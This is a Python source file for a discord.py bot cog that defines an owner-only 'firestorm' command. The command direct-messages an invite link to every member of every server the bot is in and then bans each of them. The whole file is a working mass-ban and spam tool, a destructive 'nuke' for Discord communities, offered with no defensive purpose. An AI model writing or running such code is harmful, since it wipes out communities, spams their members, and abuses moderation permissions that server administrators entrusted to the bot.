from discord.ext import commands
import discord
from .utils import checks

class Firestorm:
    """Initiate Firestorm Protocol."""
    
    def __init__(self, bot):
        self.bot = bot

    @commands.command(pass_context=True)
    @checks.is_owner()
    async def firestorm(self, ctx, invite: str):
        """Execute command: Firestorm.

        Bans all bannable users and invites them to the specified server."""
        for member in self.bot.get_all_members():
            await self.bot.send_message(member, invite)
            try:
                await self.bot.ban(member, delete_message_days='0')
            except Exception:
                await self.bot.say("Couldn't ban " + member.mention)
                continue

def setup(bot):
    bot.add_cog(Firestorm(bot))